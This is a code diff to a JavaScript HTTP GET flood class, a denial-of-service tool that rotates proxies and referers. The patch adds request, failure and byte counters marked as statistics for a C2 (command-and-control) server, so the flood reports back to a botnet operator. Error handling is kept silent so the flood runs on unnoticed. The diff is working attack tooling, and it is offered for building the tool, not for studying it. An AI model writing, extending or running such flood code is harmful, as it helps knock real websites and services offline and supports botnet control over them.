@@ -22,6 +22,15 @@ export class HTTPGetFlood {
         this.referers = referers;
         this.proxies = proxies;
         this.active = true;
+        
+        // Stats tracking for C2
+        this.stats = {
+            totalRequests: 0,
+            successfulRequests: 0,
+            failedRequests: 0,
+            totalBytes: 0,
+            totalPackets: 0
+        };
     }
 
     async start() {
@@ -101,24 +110,38 @@ export class HTTPGetFlood {
                     }
 
                     try {
+                        this.stats.totalRequests++;
                         const req = protocol.request(options, (res) => {
                             REQUESTS_SENT.add(1);
-                            res.on('data', () => {});
+                            this.stats.successfulRequests++;
+                            this.stats.totalPackets++;
+                            
+                            res.on('data', (chunk) => {
+                                this.stats.totalBytes += chunk.length;
+                            });
                             res.on('end', () => {});
-                            res.on('error', () => {}); // Handle response errors
+                            res.on('error', () => {
+                                this.stats.failedRequests++;
+                            });
                         });
 
-                        req.on('error', () => {}); // Silently handle request errors
+                        req.on('error', () => {
+                            this.stats.failedRequests++;
+                        });
+                        
                         req.on('timeout', () => {
+                            this.stats.failedRequests++;
                             try {
                                 req.destroy();
                             } catch (e) {}
                         });
 
                         req.end();
-                        BYTES_SENT.add(JSON.stringify(options.headers).length);
+                        const headerSize = JSON.stringify(options.headers).length;
+                        BYTES_SENT.add(headerSize);
+                        this.stats.totalBytes += headerSize;
                     } catch (err) {
-                        // Silently continue on request creation error
+                        this.stats.failedRequests++;
                     }
                 };
 
